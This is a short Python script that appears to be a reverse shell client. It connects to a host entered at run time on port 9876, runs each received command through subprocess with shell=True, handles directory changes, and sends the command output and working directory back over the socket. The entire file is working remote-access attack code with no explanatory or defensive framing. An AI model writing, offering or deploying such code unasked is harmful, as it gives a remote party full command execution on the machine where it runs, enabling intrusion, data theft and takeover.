import socket
import os
import subprocess

HOST = input("Connect to: ")
PORT = 9876

s = socket.socket()

s.connect((HOST, PORT))

while True:
    data = s.recv(2048)
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))

    if (len(data)) > 0:
        cmd = subprocess.Popen(data.decode("utf-8"),
                                shell = True,
                                stdout=subprocess.PIPE,
                                stdin=subprocess.PIPE,
                                stderr=subprocess.PIPE, )

        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        
        # current working directory
        cwd = "HOST:" + os.getcwd() + "$ "

        s.send(str.encode(output_str + cwd))

        print(output_str)
